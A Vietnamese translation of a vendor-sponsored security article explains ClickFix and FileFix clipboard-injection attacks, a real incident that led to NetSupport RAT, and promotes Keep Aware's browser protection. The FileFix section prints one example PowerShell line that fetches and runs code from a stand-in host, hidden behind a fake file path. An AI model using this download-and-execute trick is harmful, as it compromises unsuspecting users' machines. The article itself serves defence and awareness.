# Bên trong một cuộc tấn công Clickfix thực tế: Cách mà thủ thuật kỹ thuật xã hội này diễn ra

![Chuột mạng](https://www.bleepstatic.com/content/posts/2025/07/30/cyber-click.jpg)

Một cái nhìn sâu sắc về một chiến dịch ClickFix và một cuộc tấn công thực tế, thế hệ tiếp theo của nó (FileFix), và cách để ngăn chặn nó ngay từ đầu, trước khi thiết bị bị xâm nhập.

## ClickFix: Sao chép im lặng vào Clipboard

ClickFix, một chiến thuật kỹ thuật xã hội lừa đảo, được sử dụng bởi các tác nhân đe dọa để thao túng những người dùng không nghi ngờ, để cho phép một trang web một cách vô tình sao chép vào clipboard một cách âm thầm.

Cuối cùng, kẻ tấn công đang cố gắng để khiến người dùng (mà không biết) thực thi mã độc hại, được thu thập từ trình duyệt và lén lút đặt vào clipboard của người dùng, trên máy chủ.

Ban đầu được đặt tên là “ClickFix” vì các thông báo kỹ thuật xã hội cho biết người dùng nên “khắc phục” một vấn đề với trình duyệt của họ và yêu cầu người dùng nhấp vào một yếu tố, thuật ngữ này hiện giờ được gán cho bất kỳ cuộc tấn công nào tương tự, một cuộc tấn công mà trong đó người dùng nhấp vào một yếu tố, trang web sau đó làm đầy clipboard của nạn nhân và hướng dẫn người dùng dán mã độc hại vào terminal của thiết bị của họ.

![Hình ảnh của một cuộc tấn công ClickFix giả dạng như một thông báo CAPTCHA.](https://www.bleepstatic.com/images/news/security/k/keepaware/clickfix/ClickFix_CAPTCHA.jpg)

**Hình ảnh của một cuộc tấn công ClickFix giả dạng như một thông báo CAPTCHA.**

Các screenshot ở trên cho thấy một ví dụ về cuộc tấn công ClickFix. Ngay khi người dùng nhấp vào CAPTCHA giả, trang web âm thầm làm đầy clipboard của người dùng bằng mã độc hại. Sau đó, nó hiển thị hướng dẫn để người dùng chứng minh rằng họ là con người—bằng cách dán (mã độc hại) vào hộp thoại Run của Windows.

Để biết thêm thông tin về ClickFix, xem bài viết của chúng tôi giải thích [các vấn đề, lý do, nơi và cách thức của ClickFix](https://keepaware.com/blog/clickfix-the-what-why-where-and-how-of-it-all?utm%5Fsource=bleeping%5Fcomputer&utm%5Fmedium=article&utm%5Fcampaign=clickfix%5Fattack%5Fjuly).

## [Ngăn chặn các cuộc tấn công ClickFix ngay tại nơi chúng bắt đầu: Trong trình duyệt](https://keepaware.com/request-a-demo?utm%5Fsource=bleeping%5Fcomputer&utm%5Fmedium=article&utm%5Fcampaign=clickfix%5Fattack%5Fjuly)

Keep Aware, nền tảng bảo mật trình duyệt tùy chỉnh, phát hiện các tương tác lừa đảo theo thời gian thực, ngay tại nơi chúng xảy ra.

Bằng cách theo dõi các mẫu truy cập clipboard, đánh dấu các trang web đáng ngờ và ngăn chặn các kỹ thuật di chuyển bên như ClickFix, Keep Aware giúp các tổ chức ngăn chặn các cuộc tấn công trước khi chúng rời khỏi trình duyệt và tiếp cận máy chủ.

[Yêu cầu một Demo](https://keepaware.com/request-a-demo?utm%5Fsource=bleeping%5Fcomputer&utm%5Fmedium=article&utm%5Fcampaign=clickfix%5Fattack%5Fjuly)

## Cuộc tấn công thực tế: Kết quả Google đến nỗ lực ClickFix

Một khách hàng của Keep Aware gần đây đã gặp phải một cuộc tấn công ClickFix trong thực tế. Trong khi duyệt kết quả công cụ tìm kiếm, người dùng đã nhấp vào một trang web bị xâm nhập. Trang web này, bị tiêm mã JavaScript độc hại, đã cung cấp một thông báo ClickFix, với mục đích cuối cùng là triển khai backdoor NetSupportManager RAT.

Người dùng đã nhấp vào thông báo, cho phép trang web làm đầy clipboard (với PowerShell độc hại), và hướng dẫn người dùng dán vào terminal của thiết bị.

Tuy nhiên, Keep Aware đã xác định, chặn và cảnh báo người dùng về các lệnh đáng ngờ mà trang đã cố gắng làm đầy clipboard, hiệu quả ngăn chặn việc xâm nhập thiết bị.

Video dưới đây mô tả những gì người dùng trải nghiệm trên trang web bị xâm nhập này—một khung xác minh CAPTCHA giả. Khi nhấp vào CAPTCHA giả, mã JavaScript độc hại cập nhật clipboard của người dùng bằng mã PowerShell độc hại và nhắc nhở người dùng dán nó vào hộp thoại Run của Windows.

Dưới đây là một hướng dẫn về những gì sẽ xảy ra nếu các biện pháp bảo vệ của Keep Aware không có sẵn để hạn chế hành động của người dùng và xóa clipboard của người dùng.

Nếu chiến thuật kỹ thuật xã hội đã thành công và không có kiểm soát kỹ thuật nào tồn tại, người dùng sẽ không biết được là đã thực thi mã PowerShell độc hại.

Điều này kích hoạt một loạt các tải xuống, giải mã, lắp ráp phần mềm độc hại trên máy chủ, và thiết lập tính liên tục trong khóa đăng ký Run của người dùng—cho phép phần mềm độc hại tồn tại trên thiết bị bị xâm nhập và chạy mỗi khi người dùng đăng nhập vào tài khoản máy tính của họ.

Để biết thêm chi tiết về cuộc tấn công thực tế này, bao gồm cả cái nôi tải xuống ban đầu và mã PowerShell tiếp theo, hãy xem [hướng dẫn từng bước của chúng tôi](https://keepaware.com/blog/clickfix-to-remote-access-a-step-by-step-walkthrough?utm%5Fsource=bleeping%5Fcomputer&utm%5Fmedium=article&utm%5Fcampaign=clickfix%5Fattack%5Fjuly).

## Tác động: RATs, Stealers và nhiều hơn nữa

Các cuộc tấn công ClickFix sử dụng mã JavaScript độc hại, thao túng clipboard và kỹ thuật xã hội để cuối cùng có được quyền truy cập của kẻ tấn công từ trình duyệt đến thiết bị máy chủ.

Chúng đã được nhìn thấy trên cả các trang web độc hại và bị xâm nhập và đã được sử dụng bởi nhiều nhóm đe dọa để có quyền truy cập vào máy của nạn nhân, cuối cùng triển khai phần mềm độc hại và trojan truy cập từ xa (RATs), bao gồm AsyncRAT, Skuld Stealer, Lumma Stealer, phần mềm độc hại DarkGate, DanaBot stealer, và nhiều hơn nữa.

Khi không bị ngăn chặn bởi các biện pháp phòng ngừa kỹ thuật, những cuộc tấn công clipboard tưởng chừng như đơn giản này có thể leo thang thành sự xâm nhập toàn bộ hệ thống, cho phép các tác nhân đe dọa kiểm soát từ xa, truy cập vào dữ liệu nhạy cảm và vị trí bám trụ liên tục mà khó phát hiện và thậm chí còn khó loại bỏ hơn.

## Thế hệ tiếp theo: FileFix

FileFix là thế hệ tiếp theo, là em trai của ClickFix—một cuộc tấn công thao túng clipboard khác được thiết kế để lừa người dùng thực thi mã bên ngoài bối cảnh trình duyệt. Được ghi nhận lần đầu tiên bởi nhà nghiên cứu bảo mật mr.d0x vào cuối tháng Sáu năm nay, FileFix lừa người dùng dán các lệnh trực tiếp vào thanh địa chỉ của File Explorer, và các tác nhân đe dọa đã bắt đầu áp dụng kỹ thuật mới này.

Thoạt nhìn, đầu ra được dán có vẻ vô hại, như một đường dẫn tập tin chuẩn của Windows. Nhưng ẩn sâu bên trong là một lệnh độc hại; “đường dẫn tập tin” mà theo sau là một chú thích, che giấu mối đe dọa thực sự.

```
Powershell.exe -c "iwr malicious[.]site/mal.jpg|iex" #                                                                                          C:\Organization\Internal\Drive\Business-RFP.pdf
```

Dữ liệu đầy đủ được sao chép vào clipboard của người dùng là một lệnh PowerShell độc hại kết thúc bằng một chú thích chứa đường dẫn tập tin.

Lưu ý trong hình ảnh bên dưới, cách mà đường dẫn tập tin có vẻ vô hại trong thanh địa chỉ của Explorer không hiển thị PowerShell thực tế bị ẩn khỏi tầm nhìn của người dùng.

![File Explorer, mở bởi một tab Chrome.](https://www.bleepstatic.com/images/news/security/k/keepaware/clickfix/fileexplore-filefix.jpg)

**File Explorer, mở bởi một tab Chrome.**

Giống như ClickFix, cuộc tấn công FileFix bắt nguồn từ trình duyệt và dựa vào kỹ thuật xã hội, tiêm clipboard, và hành động của người dùng để vượt qua ranh giới giữa trình duyệt và máy chủ. FileFix, ở cốt lõi của nó, là một cuộc tấn công ClickFix dành riêng cho việc sử dụng File Explorer.

* Cả hai đều xảy ra trong bối cảnh trình duyệt.
* Cả hai đều sử dụng cùng một kỹ thuật làm đầy clipboard.
* Cả hai đều lợi dụng các trang web độc hại và bị xâm nhập, làm mờ ranh giới giữa lưu lượng web đáng tin cậy và độc hại.
* Cả hai đều dẫn đến quyền truy cập của kẻ tấn công vào thiết bị máy chủ.

Điều này có nghĩa là FileFix có thể được ngăn chặn theo cùng một cách như ClickFix: với các biện pháp bảo vệ gốc trong trình duyệt. Các giải pháp bảo mật trình duyệt, như Keep Aware, phát hiện các nỗ lực làm đầy clipboard theo thời gian thực và ngăn chặn mã đáng ngờ trước khi nó đến tay thiết bị máy chủ. Đây là lý do tại sao có các chính sách được xây dựng vào trình duyệt đảm bảo rằng các xâm nhập được giữ ở xa.

## An ninh trình duyệt chiếm ưu thế

Các cuộc tấn công ClickFix và FileFix tiết lộ một điểm mù quan trọng trong nhiều chiến lược bảo mật: trình duyệt như một vectơ cho sự xâm nhập của máy chủ. Những kỹ thuật dựa trên clipboard này sử dụng kỹ thuật xã hội và lạm dụng tương tác của người dùng với các trang web dường như hợp pháp, hoặc thậm chí bị xâm nhập, để chuyển giao mã độc hại.

Nếu không có khả năng nhìn thấy hoạt động trình duyệt hoặc kiểm soát truy cập clipboard, các biện pháp phòng ngừa truyền thống sẽ bỏ lỡ các dấu hiệu sớm. Nhưng với ​​cái nhìn gốc trong trình duyệt và bảo vệ clipboard theo thời gian thực, các tổ chức có thể chặn các cuộc tấn công này tại nguồn, trước khi bất kỳ mã nào được thực thi trên máy chủ.

Tại Keep Aware, chúng tôi đã thấy rõ cách mà các công cụ bảo mật truyền thống không đủ khả năng bảo vệ trình duyệt—giao diện chính mà nhân viên dựa vào và kẻ tấn công khai thác. Đó là lý do tại sao chúng tôi xây dựng nền tảng của mình: để phát hiện và chặn các cuộc tấn công thao túng clipboard và các cuộc tấn công khác dựa trên trình duyệt trước khi chúng có thể gây ra thiệt hại thực sự.

**Bạn có muốn tìm hiểu thêm không? Hãy thoải mái [yêu cầu một demo ở đây.](https://keepaware.com/request-a-demo?utm%5Fsource=bleeping%5Fcomputer&utm%5Fmedium=article&utm%5Fcampaign=clickfix%5Fattack%5Fjuly)**

Ngoài ra, chúng tôi tự hào được vinh danh là một trong chỉ [bốn](https://keepaware.com/blog/keep-aware-named-finalist-in-black-hat-usa-2025-startup-spotlight-competition?utm%5Fsource=bleeping%5Fcomputer&utm%5Fmedium=article&utm%5Fcampaign=clickfix%5Fattack%5Fjuly)[ ](https://keepaware.com/blog/keep-aware-named-finalist-in-black-hat-usa-2025-startup-spotlight-competition?utm%5Fsource=bleeping%5Fcomputer&utm%5Fmedium=article&utm%5Fcampaign=clickfix%5Fattack%5Fjuly)[Các ứng viên Spotlight Khởi nghiệp Black Hat USA 2025](https://keepaware.com/blog/keep-aware-named-finalist-in-black-hat-usa-2025-startup-spotlight-competition?utm%5Fsource=bleeping%5Fcomputer&utm%5Fmedium=article&utm%5Fcampaign=clickfix%5Fattack%5Fjuly) về đổi mới, và chúng tôi luôn cam kết định hình lại cách mà các tổ chức bảo mật và quản lý trình duyệt—nơi mà công việc ngày nay bắt đầu, và nơi mà các cuộc tấn công ngày nay thường khởi phát.

Nếu bạn sẽ tham dự Black Hat USA 2025 vào tuần tới, hãy xem chúng tôi trên sân khấu để trình bày ý tưởng của mình, ghé qua gian hàng Keep Aware, hoặc **[lên lịch thời gian để trò chuyện với đội ngũ](https://keepaware.com/events/black-hat-usa-2025)** tại sự kiện.

_Được tài trợ và viết bởi [Keep Aware](https://keepaware.com/request-a-demo?utm%5Fsource=bleeping%5Fcomputer&utm%5Fmedium=article&utm%5Fcampaign=clickfix%5Fattack%5Fjuly)._